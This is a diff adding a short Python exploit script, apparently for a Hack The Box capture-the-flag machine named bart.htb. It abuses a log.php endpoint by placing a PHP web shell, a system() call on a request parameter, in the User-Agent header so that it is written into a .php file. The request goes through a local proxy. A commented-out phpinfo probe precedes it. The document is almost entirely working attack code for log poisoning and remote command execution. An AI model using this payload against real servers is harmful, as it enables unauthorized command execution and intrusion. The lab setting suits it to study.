@@ -1,0 +1,8 @@
+#!/usr/bin/python3
+
+import requests
+
+proxies={'http':'http://127.0.0.1:8080'}
+#headers={'User-Agent':'mynameis: <?php phpinfo(); ?>'}
+headers={'User-Agent':"mynameis: <?php system($_REQUEST['cmd']); ?>"} 
+r = requests.get('http://internal-01.bart.htb/log/log.php?filename=phpinfo.php&username=harvey', proxies=proxies, headers=headers)
